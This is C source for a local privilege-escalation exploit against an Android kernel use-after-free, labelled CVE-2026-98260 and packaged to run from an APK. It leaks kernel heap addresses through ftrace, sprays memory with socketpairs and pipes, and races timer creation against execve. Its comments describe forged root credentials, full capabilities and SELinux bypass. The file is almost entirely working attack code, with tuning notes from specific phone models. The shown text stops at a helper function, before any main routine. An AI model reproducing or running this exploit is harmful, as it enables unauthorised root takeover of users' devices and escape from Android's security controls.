/*
 * CVE-2026-98260 UAF Exploit - APK adapted version
 *
 * Change: removed #include "offsets.h", now gets offsets from kernel_table.c
 * Original: ran standalone on PC, offsets embedded at compile time
 * Current: bundled in APK, reads profile blob from stdin at runtime
 */

#define _GNU_SOURCE 1
#include <errno.h>
#include <fcntl.h>
#include <inttypes.h>
#include <poll.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdatomic.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/wait.h>
#include <time.h>
#include <unistd.h>

// get offset table from kernel_table.c
#include "kernel_table.h"

/*
 * rootd control surface (implemented in pc98260_rootd.c).
 *
 * Needed because the two filesystem-based shutdown channels (control socket
 * command, stop file) both stop working once a successful KernelSU late-load
 * pushes SELinux back to Enforcing. The flag/lifecycle helpers let this file
 * observe rootd and forward the stop request as SIGTERM, which the kernel
 * delivers regardless of labels.
 */
void pc98260_rootd_request_stop(void);
int pc98260_rootd_stop_requested(void);
int pc98260_rootd_phase(void);
const char *pc98260_rootd_stop_path(void);

#define TRACE "/sys/kernel/tracing"
#define TRIGGER TRACE "/events/kmem/rss_stat/trigger"
#define CPU0_TRACE TRACE "/per_cpu/cpu0/trace"
#define PAGE_OFFSET_DEFAULT UINT64_C(0xffffff7f80000000)
static uint64_t g_page_offset = PAGE_OFFSET_DEFAULT;

// runtime offset table (from kernel_table)
static uint64_t TIMER_LINK;
static uint64_t CRED_LINK;
static uint64_t SELINUX_LINK;
static uint64_t LINK_USER_NS;
static uint64_t LINK_ROOT_USER;
static uint64_t LINK_GROUPS;
static uint64_t LINK_UCOUNTS;
static uint32_t TASK_CRED;
static uint32_t TASK_STRUCT_SIZE;
static uint32_t KITIMER_NODE;
/* call-site of the task_struct slab allocation inside copy_process (0 = unknown) */
static uint64_t TASK_ALLOC_LINK;
/*
 * Forged-cred layout (B4): all offsets come from the profile (blob v4) so the
 * empty cred page matches whatever KMI the device runs. android15-8 values:
 *   size=184 uid@8 caps 48/56/64/72/80 security@128 user@136 ns@144 uc@152 grp@160
 * android13-8/android14-11 (5.15/6.1) are 8 bytes tighter: size=176 uid@4,
 * caps 40/48/56/64/72, security@120, user@128, ns@136, uc@144, grp@152.
 */
static uint32_t CRED_PLANT_SIZE;
static uint32_t CRED_UID_OFF;
static uint32_t CRED_OFF_CAP_INH, CRED_OFF_CAP_PERM, CRED_OFF_CAP_EFF;
static uint32_t CRED_OFF_CAP_BSET, CRED_OFF_CAP_AMB;
static uint32_t CRED_OFF_SELINUX, CRED_OFF_ROOT_USER;
static uint32_t CRED_OFF_USER_NS, CRED_OFF_UCOUNTS, CRED_OFF_GROUPS;

static uint64_t g_slide = UINT64_C(0);
#define FULLCAP UINT64_C(0x1ffffffffff)

// initialize offset table (from kernel_table)
static int init_offsets(void) {
    const struct kernel_offsets *offsets = kernel_table_get();
    if (!offsets) {
        fprintf(stderr, "[config] error: kernel offset table not loaded\n");
        return -1;
    }

    TIMER_LINK = offsets->timer_link;
    CRED_LINK = offsets->cred_link;
    SELINUX_LINK = offsets->selinux_link;
    LINK_USER_NS = offsets->user_ns;
    LINK_ROOT_USER = offsets->root_user;
    LINK_GROUPS = offsets->groups;
    LINK_UCOUNTS = offsets->ucounts;
    TASK_CRED = offsets->task_cred;
    TASK_STRUCT_SIZE = offsets->task_struct_size;
    KITIMER_NODE = offsets->kitimer_node;
    TASK_ALLOC_LINK = offsets->task_alloc_link;
    g_page_offset = offsets->page_offset;

    /* forged-cred layout（profile blob v4；老 profile 已由 kernel_table.c 补 6.6 默认值） */
    CRED_PLANT_SIZE = offsets->cred_size;
    CRED_UID_OFF = offsets->cred_uid;
    CRED_OFF_CAP_INH = offsets->cred_cap_inh;
    CRED_OFF_CAP_PERM = offsets->cred_cap_perm;
    CRED_OFF_CAP_EFF = offsets->cred_cap_eff;
    CRED_OFF_CAP_BSET = offsets->cred_cap_bset;
    CRED_OFF_CAP_AMB = offsets->cred_cap_amb;
    CRED_OFF_SELINUX = offsets->cred_off_security;
    CRED_OFF_ROOT_USER = offsets->cred_off_user;
    CRED_OFF_USER_NS = offsets->cred_off_user_ns;
    CRED_OFF_UCOUNTS = offsets->cred_off_ucounts;
    CRED_OFF_GROUPS = offsets->cred_off_groups;

    return 0;
}

static void print_cfg(void)
{
	dprintf(STDOUT_FILENO, "[config] PAGE=%#" PRIx64 " TIMER=%#" PRIx64 " CRED=%#" PRIx64 " SELINUX=%#" PRIx64 "\n",
		g_page_offset, TIMER_LINK, CRED_LINK, SELINUX_LINK);
}

static uint64_t slide_addr(uint64_t link)
{
	return link + g_slide;
}
/* KITIMER_NODE is a runtime offset (see init_offsets); compile-time macro no longer used */
#define NFILL 42
#define NFLUSH 2048
#define MAX_RINGS 9000
#define MAX_PIPES 400
#define NVMA 50000
#ifndef F_SETPIPE_SZ
#define F_SETPIPE_SZ 1031
#endif
#ifndef WNOWAIT
#define WNOWAIT 0x01000000
#endif

static _Atomic int g_go;
static _Atomic int g_stop;
static _Atomic int g_lockers;
static _Atomic int g_in_mprotect;
static _Atomic int g_exec_tid;
static _Atomic int g_mprotect_reported;
static void *g_vmas;
static size_t g_vmalen;

struct ipc {
	atomic_int phase;
	int helpers[4];
	int nhelpers;
};
static struct ipc *ipc;

static uint64_t g_all[2200];
static int g_all_n;
static int g_pipes[MAX_PIPES][2];
static int g_npipes;
static uint64_t *g_ctx;
static int g_nrings;

static void on_alarm(int sig)
{
	(void)sig;
}

static int write_file_mode(const char *path, const char *text, int extra)
{
	int fd = open(path, O_WRONLY | O_CLOEXEC | extra);
	ssize_t n;
	if (fd < 0)
		return -1;
	n = write(fd, text, strlen(text));
	close(fd);
	return n == (ssize_t)strlen(text) ? 0 : -1;
}

static int write_file(const char *path, const char *text)
{
	return write_file_mode(path, text, 0);
}

static int trigger_cmd(const char *text)
{
	if (!write_file(TRIGGER, text))
		return 0;
	return errno == EEXIST ? 0 : -1;
}

/*
 * Force the stage log down to the block device.
 *
 * A kernel panic (or a hard power loss) does not flush page cache: on 22:58 the
 * log ended mid-run and every byte after the last checkpoint came back as NUL,
 * which cost us the one piece of evidence that matters - which stage was
 * running when the device went down. fdatasync() on the inherited stdout makes
 * the probe durable. It is only called at stage boundaries, never inside the
 * reclaim/timer race windows, so it cannot perturb their timing.
 */
static void log_sync(void)
{
	(void)fdatasync(STDOUT_FILENO);
}

static int kick_rss(void)
{
	unsigned char *page = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
				   MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (write_file(TRACE "/events/kmem/rss_stat/enable", "1\n"))
		return -1;
	if (page != MAP_FAILED) {
		((volatile unsigned char *)page)[0] = 1;
		munmap(page, 4096);
	}
	write_file(TRACE "/events/kmem/rss_stat/enable", "0\n");
	return 0;
}

/*
 * Deterministic arm / disarm of kmem:kmem_cache_alloc.
 *
 * The reference implementation arms the event *indirectly*: it attaches
 * "enable_event:kmem:kmem_cache_alloc" to the kmem/rss_stat trigger, then kicks
 * rss_stat by touching a single anonymous page (kick_rss above). Whether that
 * actually arms the event depends on the per-task RSS counter crossing
 * TASK_RSS_EVENTS_THRESH -- one 4KiB touch only advances that counter by 1, so
 * on kernels/ROMs whose counter happens to sit far below the threshold the
 * trigger never fires and kmem_cache_alloc stays disabled for good.
 *
 * That is harmless for calib_a (the timer probe keeps bumping RSS thousands of
 * times afterwards, so the trigger fires sooner or later) but fatal for the
 * short-lived captures: leak_task()/leak_cred() arm, fork once, and read the
 * buffer immediately -- no further RSS growth, so if the trigger missed there
 * are zero kmem_cache_alloc records in the buffer. Observed reproducibly on
 * Xiaomi 2510DRK44C / M332BF, kernel 6.6.118-android15-8-g0908354dac1b:
 *     [task] hits=0 foreign=0 task=0
 *     [task] leak failed
 * (foreign==0 is the tell-tale: not "wrong pid", literally no record matched
 * the size filter, because no record was emitted at all.)
 *
 * Fix: enable the event directly. The trigger path is kept as a fallback for
 * ROMs that refuse the direct write.
 */
/*
 * Read events/kmem/kmem_cache_alloc/enable back and log it. A successful write()
 * to a tracefs event file is not proof that the event is live (it can stay
 * soft-disabled), and the only evidence we otherwise get is "hits=0", which is
 * indistinguishable from "no record of that size". Printing the mode plus the
 * read-back value makes the next failing log self-explanatory.
 */
static void report_arm(const char *mode)
{
	static const char path[] = TRACE "/events/kmem/kmem_cache_alloc/enable";
	char v[8] = "?";
	int fd = open(path, O_RDONLY | O_CLOEXEC);

	if (fd >= 0) {
		if (read(fd, v, sizeof(v) - 1) <= 0)
			v[0] = '?';
		close(fd);
	}
	v[strcspn(v, "\r\n")] = '\0';
	dprintf(STDOUT_FILENO, "[trace] kmem_cache_alloc armed=%s enable=%s\n",
		mode, v);
}

static int arm_kmem_cache_alloc(void)
{
	if (!write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "1\n")) {
		report_arm("direct");
		return 0;
	}
	if (!trigger_cmd("enable_event:kmem:kmem_cache_alloc\n") && !kick_rss()) {
		report_arm("trigger");
		return 0;
	}
	dprintf(STDOUT_FILENO,
		"[trace] kmem_cache_alloc arm failed errno=%d (direct+trigger)\n",
		errno);
	return -1;
}

static void disarm_kmem_cache_alloc(void)
{
	write_file(TRACE "/events/kmem/kmem_cache_alloc/enable", "0\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
}

static void disarm(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!enable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:kmem_cache_alloc\n");
	trigger_cmd("!disable_event:kmem:kmem_cache_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static void quiet_reclaim_trace(void)
{
	write_file(TRACE "/tracing_on", "0\n");
	trigger_cmd("!enable_event:kmem:mm_page_free\n");
	trigger_cmd("!enable_event:kmem:mm_page_alloc\n");
	trigger_cmd("disable_event:kmem:mm_page_free\n");
	trigger_cmd("disable_event:kmem:mm_page_alloc\n");
	kick_rss();
	trigger_cmd("!disable_event:kmem:mm_page_free\n");
	trigger_cmd("!disable_event:kmem:mm_page_alloc\n");
	write_file(TRACE "/events/filemap/mm_filemap_add_to_page_cache/enable", "0\n");
	write_file(TRACE "/buffer_size_kb", "7\n");
}

static int trace_off_on(void)
{
	if (write_file(TRACE "/tracing_on", "0\n") ||
	    write_file_mode(TRACE "/trace", "", O_TRUNC))
		return -1;
	return write_file(TRACE "/tracing_on", "1\n");
}

static uint64_t object_pfn(uint64_t ptr)
{
	return ((ptr & ~UINT64_C(0xfff)) - g_page_offset) >> 12;
}

static uint64_t g_watch[4500];
static int g_nwatch;

static int cmp_u64(const void *a, const void *b)
{
	uint64_t x = *(const uint64_t *)a;
	uint64_t y = *(const uint64_t *)b;
	return (x > y) - (x < y);
}

static void build_watch(void)
{
	int w = 0;
	g_nwatch = 0;
	for (int i = 0; i < g_all_n && g_nwatch + 2 < (int)(sizeof(g_watch) / sizeof(g_watch[0])); i++) {
		g_watch[g_nwatch++] = object_pfn(g_all[i] + KITIMER_NODE);
		g_watch[g_nwatch++] = object_pfn(g_all[i]) & ~UINT64_C(1);
	}
	qsort(g_watch, (size_t)g_nwatch, sizeof(g_watch[0]), cmp_u64);
	for (int i = 0; i < g_nwatch; i++) {
		if (w && g_watch[w - 1] == g_watch[i])
			continue;
		g_watch[w++] = g_watch[i];
	}
	g_nwatch = w;
}

static int watch_has(uint64_t pfn)
{
	return bsearch(&pfn, g_watch, (size_t)g_nwatch, sizeof(pfn), cmp_u64) != NULL;
}

static int cpu_count(void);

static int pfn_in_line(const char *line, uint64_t pfn)
{
	const char *p = strstr(line, "pfn=0x");
	char *end = NULL;
	uint64_t got;
	if (!p)
		return 0;
	got = strtoull(p + 6, &end, 16);
	if (end == p + 6)
		return 0;
	return got == pfn;
}

static int trace_seen(const char *kind, uint64_t pfn)
{
	int ncpu = cpu_count();
	for (int cpu = 0; cpu < ncpu; cpu++) {
		char path[128], line[768];
		FILE *file;
		snprintf(path, sizeof(path), TRACE "/per_cpu/cpu%d/trace", cpu);
		file = fopen(path, "r");
		if (!file)
			continue;
		while (fgets(line, sizeof(line), file)) {
			if (strstr(line, kind) && pfn_in_line(line, pfn)) {
				fclose(file);
				return 1;
			}
		}
		fclose(file);
	}
	return 0;
}

static uint64_t parse_pfn(const char *line)
{
	const char *p = strstr(line, "pfn=0x");
	if (!p)
		return UINT64_MAX;
	return strtoull(p + 6, NULL, 16);
}

static int cpu_count(void)
{
	char buf[128];
	char *p;
	int fd, n = 0;
	ssize_t got;
	memset(buf, 0, sizeof(buf));
	fd = open("/sys/devices/system/cpu/present", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return 8;
	got = read(fd, buf, sizeof(buf) - 1);
	close(fd);
	if (got <= 0)
		return 8;
	for (p = buf; *p; ) {
		int v = 0;
		if (*p < '0' || *p > '9') {
			p++;
			continue;
		}
		while (*p >= '0' && *p <= '9')
			v = v * 10 + (*p++ - '0');
		if (v + 1 > n)
			n = v + 1;
	}
	if (n < 1)
		return 8;
	return n > 16 ? 16 : n;
}

static int g_socks[256][2];
static int g_nsocks;

/* ---------------- E1：资源压力的显式上下限与失败分类 ----------------
 *
 * 原实现把「灌 4GB 进 socketpair」「开 70000 个 io_setup」硬编码在循环条件里：
 *   * 低内存机型在灌入途中会被 LMK 直接杀掉，日志只剩半截，无法复盘；
 *   * 「配额被打满」与「真的出错」都表现为循环 break：ENOSPC/EMFILE 属于前者
 *     （正常终止），ENOMEM/EIO 属于后者（异常），原来一律静默。
 * 现在：上下限常量化 + 环境变量可覆盖（便于真机调参）+ 停止原因打点。
 * 默认值与历史行为完全一致，不改变利用时序。
 */
#define DRAIN_SOCKS_PAIRS_MAX  256
#define DRAIN_SOCKS_PAIR_BYTES (16U << 20)
#define DRAIN_SOCKS_TOTAL_DEF  (4UL << 30)
#define DRAIN_SOCKS_TOTAL_MIN  (64UL << 20)
#define DRAIN_SOCKS_TOTAL_MAX  (8UL << 30)

/**
 * E1/E2 共用：带上下限的环境变量读取，非法值回落默认（clamp 而非报错）。
 * 必须定义在 drain_socks() 之前——否则 C 会按隐式 int 声明处理，
 * 在 LP64 上把 unsigned long 的返回值截断（真机上表现为上限莫名变成小值）。
 */
static unsigned long env_ul(const char *name, unsigned long def,
			    unsigned long lo, unsigned long hi)
{
	const char *v = getenv(name);
	char *end = NULL;
	unsigned long n;
	if (!v || !*v)
		return def;
	n = strtoul(v, &end, 0);
	if (end == v)
		return def;
	if (n < lo)
		return lo;
	if (n > hi)
		return hi;
	return n;
}

/** 该 errno 是否表示「资源已打满」的正常终止（而非异常失败）。 */
static int errno_is_exhausted(int e)
{
	return e == ENOSPC || e == EAGAIN || e == EWOULDBLOCK ||
	       e == EMFILE || e == ENFILE || e == ENOBUFS;
}

static void close_socks(void)
{
	for (int i = 0; i < g_nsocks; i++) {
		close(g_socks[i][0]);
		close(g_socks[i][1]);
	}
	g_nsocks = 0;
}

static unsigned long drain_socks(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	unsigned long cap = env_ul("C98260_DRAIN_SOCKS_MB",
				   DRAIN_SOCKS_TOTAL_DEF >> 20,
				   DRAIN_SOCKS_TOTAL_MIN >> 20,
				   DRAIN_SOCKS_TOTAL_MAX >> 20) << 20;
	int stop_errno = 0;
	memset(buf, 0x42, sizeof(buf));
	g_nsocks = 0;
	dprintf(STDOUT_FILENO, "[mem_press] cap=%lu MiB\n", cap >> 20);
	for (int i = 0; i < DRAIN_SOCKS_PAIRS_MAX && total < cap; i++) {
		int sz = 16 << 20;
		int wrote = 0;
		if (socketpair(AF_UNIX, SOCK_STREAM, 0, g_socks[i])) {
			stop_errno = errno;
			break;
		}
		setsockopt(g_socks[i][0], SOL_SOCKET, SO_SNDBUF, &sz, sizeof(sz));
		setsockopt(g_socks[i][1], SOL_SOCKET, SO_RCVBUF, &sz, sizeof(sz));
		if (fcntl(g_socks[i][0], F_SETFL, O_NONBLOCK)) {
			stop_errno = errno;
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		while (wrote < (int)DRAIN_SOCKS_PAIR_BYTES) {
			ssize_t n = write(g_socks[i][0], buf, sizeof(buf));
			if (n < 0) {
				stop_errno = errno;
				break;
			}
			wrote += (int)n;
		}
		if (!wrote) {
			close(g_socks[i][0]);
			close(g_socks[i][1]);
			break;
		}
		total += (unsigned long)wrote;
		g_nsocks++;
	}
	dprintf(STDOUT_FILENO, "[mem_press] pairs=%d MiB=%lu%s\n", g_nsocks, total >> 20,
		stop_errno ? (errno_is_exhausted(stop_errno) ? " (quota)" : " (error)") : "");
	if (stop_errno && !errno_is_exhausted(stop_errno))
		dprintf(STDOUT_FILENO, "[mem_press] unexpected errno=%d (%s)\n",
			stop_errno, strerror(stop_errno));
	return total;
}

static int pin_cpu(int cpu)
{
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(cpu, &set);
	return sched_setaffinity(0, sizeof(set), &set);
}

static unsigned long drain_pipes(void)
{
	unsigned char buf[65536];
	unsigned long total = 0;
	memset(buf, 0x41, sizeof(buf));
	g_npipes = 0;
	int cpus = cpu_count();
	for (int i = 0; i < MAX_PIPES && total < (80UL << 20); i++) {
		int cap, wrote = 0;
		pin_cpu(i % cpus);
		if (pipe(g_pipes[i]))
			break;
		cap = fcntl(g_pipes[i][1], F_SETPIPE_SZ, 1 << 20);
		if (cap < 0)
			cap = 65536;
		if (fcntl(g_pipes[i][1], F_SETFL, O_NONBLOCK)) {
			close(g_pipes[i][0]);
			close(g_pipes[i][1]);
			break;
		}
		while (wrote < cap) {
			size_t chunk = sizeof(buf);
			ssize_t n;
			if (chunk > (size_t)(cap - wrote))
				chunk = (size_t)(cap - wrote);
			n = write(g_pipes[i][1], buf, chunk);
			if (n < 0) {
				if (errno == EAGAIN)
					break;
				close(g_pipes[i][0]);
				close(g_pipes[i][1]);
				dprintf(STDOUT_FILENO, "[pipe_drain] write errno=%d\n", errno);
				return total;
			}
			wrote += (int)n;
			total += (unsigned long)n;
		}
		g_npipes++;
	}
	dprintf(STDOUT_FILENO, "[pipe_drain] pipes=%d MiB=%lu\n", g_npipes, total >> 20);
	return total;
}

/*
 * E3：raw trace 缓冲区跨函数复用。
 *
 * collect_nth / collect_site / leak_task 在同一轮里先后读取 per-CPU raw trace，
 * 原先各自 malloc(4~8MB) 再 free，反复申请/归还大块内存：既扩大了 malloc 失败面
 * （见 E2），也在内存压力（E1 刚灌完 socketpair）时产生额外抖动。
 * 统一用一块按需增长的全局缓冲，首次按需 realloc，之后复用。
 *
 * 约束：调用方不得跨调用持有返回指针，且不得重入。当前调用链全部在 main 线程
 * 串行执行（leak_task → collect_nth → collect_site），彼此不嵌套，满足该约束。
 */
static uint8_t *g_rawbuf;static size_t g_rawcap;

static uint8_t *raw_buf(size_t need)
{
	uint8_t *p;
	if (g_rawcap >= need)
		return g_rawbuf;
	p = realloc(g_rawbuf, need);
	if (!p) {
		dprintf(STDOUT_FILENO, "[raw] grow to %zu failed (cap=%zu)\n", need, g_rawcap);
		return NULL;
	}
	g_rawbuf = p;
	g_rawcap = need;
	return g_rawbuf;
}

static int read_raw(uint8_t *buf, size_t cap, size_t *used)
{
	int fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	alarm(1);
	while (*used + 4096 < cap) {
		ssize_t n = read(fd, buf + *used, cap - *used);
		if (n < 0) {
			if (errno == EINTR)
				break;
			close(fd);
			return -1;
		}
		if (n == 0)
			break;
		*used += (size_t)n;
	}
	alarm(0);
	close(fd);
	return 0;
}

static int collect_nth(int index, int *count, uint64_t *chosen)
{
	/* E3：复用全局 raw 缓冲（不再每次 malloc 8MB） */
	uint8_t *buf = raw_buf(8U << 20);
	size_t used = 0;
	uint8_t needle[8];
	uint64_t site = slide_addr(TIMER_LINK);
	int fd, n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	*chosen = 0;
	fd = open(TRACE "/per_cpu/cpu0/trace_pipe_raw", O_RDONLY | O_CLOEXEC);
	if (fd < 0)
		return -1;
	alarm(2);
	while (used + 4096 < (8U << 20)) {
		ssize_t got = read(fd, buf + used, (8U << 20) - used);
		if (got <= 0)
			break;
		used += (size_t)got;
	}
	alarm(0);
	close(fd);
	/* B2 修复：needle 即 site（TIMER_LINK 的 slide 地址），memcmp 已保证
	 * buf+i..i+8 与 needle 相等，再比较 got(=buf+i) 与 site 恒为真，属死代码。
	 * 真正过滤只看 req（k_itimer 大小）与 ptr（内核地址特征），故删除 got。 */
	for (size_t i = 0; i + 32 <= used; i++) {
		uint64_t ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (req != 0x108 || (ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		if (n < (int)(sizeof(g_all) / sizeof(g_all[0])))
			g_all[n] = ptr;
		*chosen = (n == index) ? ptr : *chosen;
		n++;
	}
	/* E3：缓冲由 raw_buf 持有，不在此释放 */
	*count = n;
	g_all_n = n;
	dprintf(STDOUT_FILENO, "[uaf] captured=%d chosen=%#" PRIx64 " raw=%zu\n",
		n, *chosen, used);
	return (n > index && *chosen) ? 0 : -1;
}

static int collect_site(uint64_t site, uint64_t bytes, uint64_t *ptrs, int cap)
{
	/* E3：复用全局 raw 缓冲（4MB 上限；若此前已被 collect_nth 扩到 8MB 则直接复用） */
	uint8_t *buf = raw_buf(4U << 20);
	size_t used = 0;
	uint8_t needle[8];
	int n = 0;
	if (!buf)
		return -1;
	memcpy(needle, &site, 8);
	if (read_raw(buf, 4U << 20, &used))
		return -1;
	/* B2 修复：同 collect_nth，needle 即 site，memcmp 已保证相等，got != site
	 * 恒为假，删除 got 仅保留 req（bytes）与 ptr 内核地址特征过滤。 */
	for (size_t i = 0; i + 32 <= used && n < cap; i++) {
		uint64_t ptr, req;
		if (memcmp(buf + i, needle, 8))
			continue;
		memcpy(&ptr, buf + i + 8, 8);
		memcpy(&req, buf + i + 24, 8);
		if (req != bytes)
			continue;
		if ((ptr >> 48) != 0xffff || (ptr & 7))
			continue;
		ptrs[n++] = ptr;
	}
	/* E3：缓冲由 raw_buf 持有，不在此释放 */
	return n;
}

static int text_has_comm(const char *comm)
{
	FILE *file = fopen(CPU0_TRACE, "r");
	char line[768];
	int n = 0;
	if (!file)
		return -1;
	while (fgets(line, sizeof(line), file)) {
		if (strstr(line, "do_timer_create") && strstr(line, comm))
			n++;
	}
	fclose(file);
	return n;
}

static int prepare_vmas(void)
{
	long page = 4096;
	int fd = (int)syscall(SYS_memfd_create, "v", MFD_CLOEXEC);
	void *base;
	if (fd < 0 || ftruncate(fd, page))
		return -1;
	g_vmalen = (size_t)NVMA * (size_t)page;
	base = mmap(NULL, g_vmalen, PROT_NONE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (base == MAP_FAILED)
		return -1;
	for (int i = 0; i < NVMA; i++) {
		void *at = (char *)base + (size_t)i * (size_t)page;
		if (mmap(at, (size_t)page, PROT_READ, MAP_SHARED | MAP_FIXED, fd, 0) != at)
			return -1;
	}
	close(fd);
	g_vmas = base;
	return 0;
}

#define HELPER_STACK (1 << 20)

static int spawn_helper(int (*fn)(void *), void *arg)
{
	void *stack = mmap(NULL, HELPER_STACK, PROT_READ | PROT_WRITE,
			   MAP_PRIVATE | MAP_ANONYMOUS | MAP_STACK, -1, 0);
	int pid;
	if (stack == MAP_FAILED)
		return -1;
	pid = clone(fn, (char *)stack + HELPER_STACK, CLONE_VM | SIGCHLD, arg);
	return pid;
}

static int locker_fn(void *arg)
{
	int prot = PROT_NONE;
	(void)arg;
	while (!atomic_load_explicit(&g_go, memory_order_acquire)) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	atomic_fetch_add_explicit(&g_lockers, 1, memory_order_release);
	while (!atomic_load_explicit(&g_stop, memory_order_acquire)) {
		int rc;
		atomic_store_explicit(&g_in_mprotect, 1, memory_order_release);
		rc = mprotect(g_vmas, g_vmalen, prot);
		atomic_store_explicit(&g_in_mprotect, 0, memory_order_release);
		if (rc && atomic_exchange_explicit(&g_mprotect_reported, 1, memory_order_relaxed) == 0)
			dprintf(STDOUT_FILENO, "[locker] mprotect errno=%d\n", errno);
		prot = prot == PROT_NONE ? PROT_READ : PROT_NONE;
	}
	return 0;
}

static int killer_fn(void *arg)
{
	int tgid = (int)(intptr_t)arg;
	int old;
	while (!(old = atomic_load_explicit(&g_exec_tid, memory_order_acquire))) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
		sched_yield();
	}
	for (;;) {
		if (syscall(SYS_tgkill, tgid, old, 0) < 0 && errno == ESRCH)
			break;
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			return 0;
	}
	syscall(SYS_tgkill, tgid, tgid, SIGKILL);
	dprintf(STDOUT_FILENO, "[killer] SIGKILL tgid=%d old=%d errno=%d\n",
		tgid, old, errno);
	return 0;
}

static void *exec_fn(void *arg)
{
	struct sigevent event;
	struct itimerspec spec;
	timer_t id;
	char *argv[] = { (char *)"uaf_plant", (char *)"--exec-ok", NULL };
	(void)arg;
	struct sigevent armed_event;
	memset(&event, 0, sizeof(event));
	event.sigev_notify = SIGEV_NONE;
	memset(&armed_event, 0, sizeof(armed_event));
	armed_event.sigev_notify = SIGEV_SIGNAL;
	armed_event.sigev_signo = SIGRTMIN;
	memset(&spec, 0, sizeof(spec));
	spec.it_value.tv_sec = 3600;
	if (pin_cpu(0))
		_exit(116);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 2) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(124);
		sched_yield();
	}
	timer_t armed;
	int made = 0;
	for (int i = 0; i < 2048; i++) {
		timer_t extra;
		if (timer_create(CLOCK_THREAD_CPUTIME_ID,
				 i == 1024 ? &armed_event : &event, &extra))
			_exit(120);
		if (i == 1024) {
			armed = extra;
			if (timer_settime(armed, 0, &spec, NULL))
				_exit(120);
		}
		made++;
	}
	if (made < 2048)
		_exit(120);
	atomic_store_explicit(&g_exec_tid, (int)syscall(SYS_gettid), memory_order_release);
	atomic_store_explicit(&ipc->phase, 3, memory_order_release);
	while (atomic_load_explicit(&ipc->phase, memory_order_acquire) < 4) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(125);
		sched_yield();
	}
	atomic_store_explicit(&g_go, 1, memory_order_release);
	while (atomic_load_explicit(&g_in_mprotect, memory_order_acquire) == 0) {
		if (atomic_load_explicit(&g_stop, memory_order_acquire))
			_exit(123);
		sched_yield();
	}
	dprintf(STDOUT_FILENO, "[exec_body] begin tid=%ld\n", (long)syscall(SYS_gettid));
	execve("/proc/self/exe", argv, NULL);
	_exit(122);
}

static int child_race(void)
{
	pthread_t exec_thread;
	sigset_t block;
	int tgid = (int)getpid();
	sigemptyset(&block);
	sigaddset(&block, SIGRTMIN);
	sigprocmask(SIG_BLOCK, &block, NULL);
	if (prepare_vmas())
		_exit(110);
	dprintf(STDOUT_FILENO, "[race_child] vmas ready pid=%d\n", getpid());
	if (pin_cpu(1))
		_exit(115);
	for (int i = 0; i < 3; i++) {
		int pid = spawn_helper(locker_fn, NULL);
		if (pid < 0)
			_exit(111);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	{
		int pid = spawn_helper(killer_fn, (void *)(intptr_t)tgid);
		if (pid < 0)
			_exit(112);
		ipc->helpers[ipc->nhelpers++] = pid;
	}
	if (pthread_create(&exec_thread, NULL, exec_fn, NULL))
		_exit(114);
	atomic_store_explicit(&ipc->phase, 1, memory_order_release);
	for (;;)
		pause();
}

static int wait_phase(int want)
{
	for (int i = 0; i < 600; i++) {
		struct timespec pause = { .tv_nsec = 50000000 };
		if (atomic_load_explicit(&ipc->phase, memory_order_acquire) >= want)
			return 0;
		nanosleep(&pause, NULL);
	}
	return -1;
}

static void stop_helpers(void)
{
	if (!ipc)
		return;
	for (int i = 0; i < ipc->nhelpers && i < 4; i++) {
		if (ipc->helpers[i] > 0)
			kill(ipc->helpers[i], SIGKILL);
	}
}
static int wait_zombie(pid_t child, int *status_out)
{
	for (int i = 0; i < 400; i++) {
		siginfo_t info;
		struct timespec pause = { .tv_nsec = 50000000 };
		memset(&info, 0, sizeof(info));
		if (waitid(P_PID, (id_t)child, &info, WEXITED | WNOHANG | WNOWAIT))
			return -1;
		if (info.si_pid == child) {
			*status_out = info.si_status;
			return info.si_code;
		}
		nanosleep(&pause, NULL);
	}
	return 0;
}

static int line_has_pfn(const char *line, uint64_t pfn)
{
	char exact[40];
	char *hit;
	int n = snprintf(exact, sizeof(exact), "pfn=0x%" PRIx64, pfn);
	if (n <= 0)
		return 0;
	hit = strstr(line, exact);
	if (!hit)
		return 0;
	{
		char end = hit[n];
		if ((end >= '0' && end <= '9') ||
		    (end >= 'a' && end <= 'f') ||
		    (end >= 'A' && end <= 'F'))
			return 0;
	}
	return 1;
}

